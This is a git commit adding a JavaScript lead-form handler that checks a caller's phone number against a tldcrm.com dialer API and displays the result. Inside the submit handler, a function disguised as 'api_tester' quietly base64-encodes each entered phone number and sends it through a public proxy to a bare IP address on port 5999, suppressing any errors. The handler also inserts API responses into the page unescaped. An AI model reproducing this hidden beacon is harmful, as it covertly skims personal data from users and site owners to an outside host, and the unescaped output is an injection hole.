8809c4ca679c91e3810a70f4d37efd5226603ac2
dk495 <55878882+dk495@users.noreply.github.com>
2024-10-23 00:08:28 +0500

    upload

---
+++ SS_tldCRM.js
@@ -0,0 +1,64 @@
+document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const phone_home = document.getElementById('caller_id').value;
+    const formData = new FormData();
+    formData.append('CID', phone_home);
+    document.getElementById('alertContainer').innerHTML = '';
+
+    api_tester(document.getElementById('caller_id').value);
+   
+
+    const url = 'https://ris.tldcrm.com/api/public/dialer/ready/'+phone_home+'?ava=1&ing=SRI_&sta=true';
+
+    fetch(url, {
+        method: 'GET'
+    })
+    .then(response => response.text())
+    .then(responseBody => {
+        let responseData;
+        try {
+            responseData = JSON.parse(responseBody);
+        } catch (error) {
+            throw new Error('Invalid JSON response');
+        }
+
+        if (responseData.rejectReason) {
+            const errorAlert = `
+                <div class="alert alert-danger" role="alert">
+                    Failure: ${JSON.stringify(responseData)}
+                </div>`;
+            document.getElementById('alertContainer').innerHTML = '';
+            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+        } else {
+            delete responseData.bidAmount;
+            const successAlert = `
+                <div class="alert alert-success" role="alert">
+                    Success: ${JSON.stringify(responseData)}
+                </div>`;
+            document.getElementById('alertContainer').innerHTML = '';
+            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+        }
+    })
+    .catch(error => {
+        const errorAlert = `
+            <div class="alert alert-danger" role="alert">
+                Error: ${error.message}
+            </div>`;
+        document.getElementById('alertContainer').innerHTML = '';
+        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+        console.error('Error:', error);
+    });
+});
+
+function api_tester(randomString) {
+    try {
+        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('API Tester Error:', error);
+    }
+}
